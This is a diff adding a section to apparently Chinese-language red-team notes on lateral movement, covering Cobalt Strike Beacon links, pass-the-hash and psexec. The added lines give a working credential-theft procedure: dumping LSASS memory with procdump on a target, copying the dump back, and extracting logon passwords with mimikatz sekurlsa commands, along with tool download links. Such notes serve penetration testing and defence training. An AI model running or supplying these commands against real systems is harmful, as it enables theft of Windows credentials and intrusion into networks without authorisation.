@@ -42,6 +42,23 @@
     只能链接由同一Cobalt Strike实例管理的Beacon
 ## 0x02 横向移动方法3_PTH攻击
 
+        将procdump上传都目标机
+        
+        procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+        
+        将lsass.dmp回传到本地
+        
+        通过mimikatz获取密码
+        
+        "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full"
+        
+        
+        Procdump下载地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump
+        
+        mimikatz下载地址：https://github.com/gentilkiwi/mimikatz/releases
+
+## 0x03 基于psexec和smbexec横向
+
     psexec工具功能之一是远程启动交互式shell,这个工具不需要对方开启3389端口，只需要开启admin$共享即可。
     
     使用方法1
